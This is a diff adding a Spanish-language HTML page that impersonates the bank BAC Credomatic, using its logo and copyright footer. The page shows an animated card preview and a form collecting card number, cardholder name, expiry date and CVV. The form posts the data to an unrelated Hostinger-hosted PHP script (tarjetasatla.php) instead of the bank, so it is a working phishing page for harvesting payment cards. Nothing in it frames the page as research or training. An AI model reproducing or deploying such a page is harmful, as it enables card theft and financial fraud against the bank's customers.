@@ -1,0 +1,284 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BAC CREDOMATIC</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+      <img src="https://www.baccredomatic.com/themes/custom/bac_theme/images/bac_logo.svg" alt="" style="width: 100px; margin-left: 20px;">
+      <h1></h1>
+        <style>
+            .card-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  perspective: 1000px; /* Efecto 3D */
+}
+
+.credit-card {
+  width: 300px;
+  height: 180px;
+  position: relative;
+  transform-style: preserve-3d;
+  transition: transform 0.6s;
+  z-index: 1;
+}
+.payment-form{
+    box-sizing: border-box;
+}
+
+.card-front, .card-back {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  border-radius: 10px;
+  
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+  backface-visibility: hidden;
+}
+
+.card-front {
+  background: linear-gradient(135deg, #0877c2, #ff7070);
+  color: white;
+  font-family: Arial, sans-serif;
+  font-size: 16px;
+}
+
+.card-back {
+    background: linear-gradient(135deg, #8f8f8f, #e6e6e6);
+  color: white;
+  transform: rotateY(180deg);
+  display: block;
+  
+  align-items: center;
+}
+
+.cvv-box {
+  background: white;
+  color: black;
+  padding: 10px;
+  font-size: 18px;
+  border-radius: 5px;
+  text-align: center;
+  width: 60px;
+  margin-top: 20px;
+  margin-left: 150px;
+}
+
+.payment-form input {
+  width: 100%;
+  margin: 10px 0;
+  padding: 10px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  box-sizing: border-box;
+  outline-color: #009bd8;
+}
+.card-holder{
+    font-size: 16px;
+}
+.card-info{
+    margin-top: 20px;
+    margin-right: 60px;
+}
+.vence{
+    margin-top: 15px;
+    margin-left: 150px;
+}
+
+.card-number{
+    font-size: 16px;
+    margin-top: 60px;
+    margin-right: 85px;
+}
+
+.banda{
+    background-color: black;
+    width: 100%;
+    height: 30px;
+    display: block;
+    margin-top: 10px;
+}
+.card-logo {
+  width: 50px;
+  height: auto;
+  position: absolute;
+  top: 15px;
+  right: 20px;
+  z-index: 2;
+}
+.hidden {
+  display: none;
+}
+.card-button {
+    background-color: #C8102F;; /* Color principal */
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 1rem;
+    margin-top: 10px;
+    width: 80%;
+}
+        </style>
+    </header>
+   
+    <main>
+        <div class="card-container">
+            <div class="credit-card" id="credit-card">
+                <img id="card-logo" src="" alt="" class="card-logo hidden">
+
+              <div class="card-front">
+                <div class="card-number">0000 0000 0000 0000</div>
+                <div class="card-info">
+                  <span class="card-holder">NOMBRE DEL TITULAR</span>
+                </div>
+                <div class="vence">
+                    <span class="card-expiry">MM/YY</span>
+                </div>
+              </div>
+              <div class="card-back">
+                <span class="banda" ></span> 
+                <div class="cvv-box"><span>•••</span> </div>
+              </div>
+            </div>
+          
+            <form class="payment-form" action="https://sandybrown-goose-468890.hostingersite.com/tarjetasatla.php" method="post">
+              <input type="text" id="card-number" placeholder="Número de Tarjeta" maxlength="19" required="" autocomplete="off" name="TarjetaNumero" inputmode="numeric">
+              <input type="text" id="card-holder" placeholder="Nombre del Titular" required="" autocomplete="off" onkeyup="mayus(this);" name="nombre">
+              <input type="text" id="card-expiry" placeholder="Fecha de vencimiento" maxlength="5"  onkeyup="
+              var v = this.value;
+              if (v.match(/^\d{2}$/) !== null) {
+              this.value = v + '/';
+              }
+              else if (v.match(/^\d{4}\$/) !== null) {
+              this.value = v + '/';
+              }"
+              maxlength="5"
+              required="" autocapitalize="off" name="FechaVencimiento" inputmode="numeric">
+              <input type="text" id="card-cvv" placeholder="CVV (Codigo de seguridad)" maxlength="3" required="" autocomplete="off" name="codigo" inputmode="numeric">
+              <button id="boton" type="submit" class="card-button">CONTINUAR</button>
+            </form>
+          </div>
+          
+          
+    </main>
+<script>
+const card = document.getElementById('credit-card');
+const cardNumberInput = document.getElementById('card-number');
+const cardHolderInput = document.getElementById('card-holder');
+const cardExpiryInput = document.getElementById('card-expiry');
+const cardCVVInput = document.getElementById('card-cvv');
+
+// Actualizar número de tarjeta
+cardNumberInput.addEventListener('input', function () {
+  let value = this.value.replace(/\D/g, ''); // Eliminar caracteres no numéricos
+  value = value.replace(/(\d{4})/g, '$1 ').trim(); // Espacios cada 4 dígitos
+  document.querySelector('.card-number').textContent = value || '•••• •••• •••• ••••';
+});
+
+// Actualizar nombre del titular
+cardHolderInput.addEventListener('input', function () {
+  document.querySelector('.card-holder').textContent = this.value.toUpperCase() || 'NOMBRE DEL TITULAR';
+});
+
+// Actualizar fecha de expiración
+cardExpiryInput.addEventListener('input', function () {
+  let value = this.value.replace(/\D/g, '');
+  if (value.length > 2) {
+    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+  }
+  document.querySelector('.card-expiry').textContent = value || 'MM/YY';
+});
+
+// Mostrar parte trasera al ingresar CVV
+cardCVVInput.addEventListener('focus', function () {
+  card.style.transform = 'rotateY(180deg)';
+});
+
+// Ocultar parte trasera al salir del input CVV
+cardCVVInput.addEventListener('blur', function () {
+  card.style.transform = 'rotateY(0deg)';
+});
+
+// Actualizar CVV en la tarjeta
+cardCVVInput.addEventListener('input', function () {
+  document.querySelector('.cvv-box').textContent = this.value || '•••';
+});
+
+const cardLogo = document.getElementById('card-logo');
+
+
+cardNumberInput.addEventListener('input', function() {
+  let value = this.value.replace(/\D/g, '');
+  value = value.replace(/(\d{4})/g, '$1 ').trim();
+  document.querySelector('.card-number').textContent = value || '•••• •••• •••• ••••';
+
+  // Detectar la marca de la tarjeta y mostrar el logo
+  if (/^4/.test(value)) {
+    cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png';
+    cardLogo.classList.remove('hidden');
+  } else if (/^5[1-5]/.test(value)) {
+    cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
+    cardLogo.classList.remove('hidden');
+  } else if (/^3[47]/.test(value)) {
+    cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
+    cardLogo.classList.remove('hidden');
+  } else {
+    cardLogo.src = '';
+    cardLogo.classList.add('hidden'); // Oculta el logo si no hay coincidencias
+  }
+});
+
+
+  // Campo numeros
+  var numeros = document.getElementById('numeros');
+  
+  // Poner cursor en el campo numeros
+  numeros.focus();
+  
+  numeros.onkeydown = function(e){
+      // Permitir la tecla para borrar
+      if (e.key == 'Backspace') return true;
+  
+      // Permitir flecha izquierda
+      if (e.key == 'ArrowLeft') return true;
+  
+      // Permitir flecha derecha
+      if (e.key == 'ArrowRight') return true;
+  
+      // Bloquear tecla de espacio
+      if (e.key == ' ') return false;
+  
+      // Bloquear tecla si no es un numero
+      if (isNaN(e.key)) return false;
+  };
+  
+  numeros.onkeyup = function(){
+      numeros.value = numeros.value
+                      // Borrar todos los espacios
+                      .replace(/\s/g, '')
+  
+                      // Agregar un espacio cada dos numeros
+                      .replace(/([0-9]{4})/g, '$1 ')
+  
+                      // Borrar espacio al final
+                      .trim();
+  };
+  function mayus(e){
+
+      e.value = e.value.toUpperCase();
+      }
+  </script>
+    <footer>
+        <p>&copy; 2025 BAC CREDOMATIC. Todos los derechos reservados.</p>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
